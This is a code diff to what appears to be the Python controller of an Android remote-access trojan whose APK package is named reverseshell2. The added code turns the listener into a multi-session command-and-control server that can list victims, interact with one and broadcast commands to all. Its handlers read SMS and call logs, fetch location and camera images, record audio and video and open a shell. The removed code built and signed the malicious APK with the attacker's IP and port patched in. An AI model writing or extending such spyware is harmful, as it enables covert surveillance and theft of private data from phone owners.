@@ -293,110 +293,136 @@ def callLogs(client):
     		if not os.path.getsize(filename):
     			os.remove(filename)
 
-def get_shell(ip,port):
-    soc = socket.socket() 
+class SessionManager:
+    def __init__(self):
+        self.sessions = {}
+        self.lock = threading.Lock()
+        self.counter = 1
+
+    def add(self, conn, addr):
+        with self.lock:
+            sid = self.counter
+            self.sessions[sid] = {'conn': conn, 'addr': addr, 'active': True}
+            self.counter += 1
+            return sid
+
+    def remove(self, sid):
+        with self.lock:
+            if sid in self.sessions:
+                self.sessions[sid]['active'] = False
+                try:
+                    self.sessions[sid]['conn'].close()
+                except Exception:
+                    pass
+                del self.sessions[sid]
+
+    def list(self):
+        with self.lock:
+            return [(sid, s['addr'], s['active']) for sid, s in self.sessions.items()]
+
+    def get(self, sid):
+        with self.lock:
+            return self.sessions.get(sid, None)
+
+    def broadcast(self, msg):
+        with self.lock:
+            for s in self.sessions.values():
+                try:
+                    s['conn'].sendall(msg.encode('utf-8'))
+                except Exception:
+                    s['active'] = False
+
+session_manager = SessionManager()
+
+def get_shell(ip, port):
     soc = socket.socket(type=socket.SOCK_STREAM)
     try:
-        # Restart the TCP server on exit
         soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         soc.bind((ip, int(port)))
     except Exception as e:
-        print(stdOutput("error")+"\033[1m %s"%e);exit()
-
-    soc.listen(2)
+        print(stdOutput("error")+f"\033[1m {e}"); exit()
+    soc.listen(10)
     print(banner)
-    while True:
-        que = queue.Queue()
-        t = threading.Thread(target=connection_checker,args=[soc,que])
-        t.daemon = True
-        t.start()
-        while t.is_alive(): animate("Waiting for Connections  ")
-        t.join()
-        conn, addr = que.get()
-        clear()
-        print("\033[1m\033[33mGot connection from \033[31m"+"".join(str(addr))+"\033[0m")
-        print(" ")
+    print("\033[1m\033[32m[+] Multi-session mode enabled.\033[0m")
+    print("Type 'sessions' to list, 'interact <id>' to interact, 'broadcast <cmd>' to send to all.")
+
+    def session_handler(sid, conn, addr):
+        try:
+            while session_manager.get(sid) and session_manager.get(sid)['active']:
+                msg = conn.recv(4096).decode("UTF-8", "ignore")
+                if not msg:
+                    break
+                if msg.strip() == "IMAGE":
+                    getImage(conn)
+                elif "readSMS" in msg.strip():
+                    content = msg.strip().split(" ")
+                    data = content[1]
+                    readSMS(conn, data)
+                elif msg.strip() == "SHELL":
+                    shell(conn)
+                elif msg.strip() == "getLocation":
+                    getLocation(conn)
+                elif msg.strip() == "stopVideo123":
+                    stopVideo(conn)
+                elif msg.strip() == "stopAudio":
+                    stopAudio(conn)
+                elif msg.strip() == "callLogs":
+                    callLogs(conn)
+                elif msg.strip() == "help":
+                    help()
+                else:
+                    print(stdOutput("error")+msg) if "Unknown Command" in msg else print("\033[1m"+msg) if "Hello there" in msg else print(msg)
+        except Exception as e:
+            print(stdOutput("error")+f"Session {sid} error: {e}")
+        finally:
+            session_manager.remove(sid)
+            print(f"\033[1m\033[31m[-] Session {sid} ({addr}) disconnected.\033[0m")
+
+    def acceptor():
         while True:
-            msg = conn.recv(4024).decode("UTF-8")
-            if(msg.strip() == "IMAGE"):
-                getImage(conn)
-            elif("readSMS" in msg.strip()):
-                content = msg.strip().split(" ")
-                data = content[1]
-                readSMS(conn,data)
-            elif(msg.strip() == "SHELL"):
-                shell(conn)
-            elif(msg.strip() == "getLocation"):
-                getLocation(conn)
-            elif(msg.strip() == "stopVideo123"):
-                stopVideo(conn)
-            elif(msg.strip() == "stopAudio"):
-                stopAudio(conn)
-            elif(msg.strip() == "callLogs"):
-                callLogs(conn)
-            elif(msg.strip() == "help"):
-                help()
-            else:
-                print(stdOutput("error")+msg) if "Unknown Command" in msg else print("\033[1m"+msg) if "Hello there" in msg else print(msg)
-            message_to_send = input("\033[1m\033[36mInterpreter:/> \033[0m")+"\n"
-            conn.send(message_to_send.encode("UTF-8"))
-            if message_to_send.strip() == "exit":
-                print(" ")
-                print("\033[1m\033[32m\t (∗ ･‿･)ﾉ゛\033[0m")
-                sys.exit()
-            if(message_to_send.strip() == "clear"):clear()
+            conn, addr = soc.accept()
+            sid = session_manager.add(conn, addr)
+            print(f"\033[1m\033[33m[+] New session {sid} from {addr}\033[0m")
+            t = threading.Thread(target=session_handler, args=(sid, conn, addr), daemon=True)
+            t.start()
 
+    threading.Thread(target=acceptor, daemon=True).start()
 
-def connection_checker(socket,queue):
-    conn, addr = socket.accept()
-    queue.put([conn,addr])
-    return conn,addr
-
-
-def build(ip,port,output,ngrok=False,ng=None,icon=None):
-    editor = "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
-    try:
-        file = open(editor,"r").readlines()
-        #Very much uncertaninity but cant think any other way to do it xD
-        file[18]=file[18][:21]+"\""+ip+"\""+"\n"
-        file[23]=file[23][:21]+"\""+port+"\""+"\n"
-        file[28]=file[28][:15]+" 0x0"+"\n" if icon else file[28][:15]+" 0x1"+"\n"
-        str_file="".join([str(elem) for elem in file])
-        open(editor,"w").write(str_file)
-    except Exception as e:
-        print(e)
-        sys.exit()
-    java_version = execute("java -version")
-    if java_version.returncode: print(stdOutput("error")+"Java not installed or found");exit()
-    #version_no = re.search(pattern, java_version.stderr).groups()[0]
-    # if float(version_no) > 1.8: print(stdOutput("error")+"Java 8 is required, Java version found "+version_no);exit()
-    print(stdOutput("info")+"\033[0mGenerating APK")
-    outFileName = output if output else "karma.apk"
-    que = queue.Queue()
-    t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/apktool.jar b Compiled_apk  -o "+outFileName,que],)
-    t.start()
-    while t.is_alive(): animate("Building APK ")
-    t.join()
-    print(" ")
-    resOut = que.get()
-    if not resOut.returncode:
-        print(stdOutput("success")+"Successfully apk built in \033[1m\033[32m"+getpwd(outFileName)+"\033[0m")
-        print(stdOutput("info")+"\033[0mSigning the apk")
-        t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/sign.jar -a "+outFileName+" --overwrite",que],)
-        t.start()
-        while t.is_alive(): animate("Signing Apk ")
-        t.join()
-        print(" ")
-        resOut = que.get()
-        if not resOut.returncode:
-            print(stdOutput("success")+"Successfully signed the apk \033[1m\033[32m"+outFileName+"\033[0m")
-            if ngrok:
-                clear()
-                get_shell("0.0.0.0",8000) if not ng else get_shell("0.0.0.0",ng)
-            print(" ")
+    # Main session control loop
+    while True:
+        cmd = input("\033[1m\033[36m[MultiSession]> \033[0m").strip()
+        if cmd == "sessions":
+            sessions = session_manager.list()
+            print("\033[1mActive Sessions:\033[0m")
+            for sid, addr, active in sessions:
+                print(f"  {sid}: {addr} {'(active)' if active else '(closed)'}")
+        elif cmd.startswith("interact "):
+            try:
+                sid = int(cmd.split()[1])
+                s = session_manager.get(sid)
+                if not s or not s['active']:
+                    print(f"\033[1m\033[31mSession {sid} not found or closed.\033[0m")
+                    continue
+                print(f"\033[1m\033[32m[*] Interacting with session {sid} ({s['addr']})\033[0m")
+                while s['active']:
+                    message_to_send = input("\033[1m\033[36mInterpreter:/> \033[0m")+"\n"
+                    s['conn'].send(message_to_send.encode("UTF-8"))
+                    if message_to_send.strip() == "exit":
+                        break
+                    try:
+                        msg = s['conn'].recv(4096).decode("UTF-8", "ignore")
+                        print(msg)
+                    except Exception:
+                        print(f"\033[1m\033[31mSession {sid} connection lost.\033[0m")
+                        break
+            except Exception as e:
+                print(f"\033[1m\033[31mError: {e}\033[0m")
+        elif cmd.startswith("broadcast "):
+            bcmd = cmd[len("broadcast "):]
+            session_manager.broadcast(bcmd+"\n")
+            print(f"\033[1m\033[32m[+] Broadcasted to all sessions.\033[0m")
+        elif cmd in ("exit", "quit"):
+            print("\033[1m\033[32mExiting multi-session server.\033[0m")
+            os._exit(0)
         else:
-            print("\r"+resOut.stderr)
-            print(stdOutput("error")+"Signing Failed")
-    else:
-        print("\r"+resOut.stderr)
-        print(stdOutput("error")+"Building Failed")
+            print("\033[1m\033[33mUnknown command. Use 'sessions', 'interact <id>', 'broadcast <cmd>', 'exit'.\033[0m")
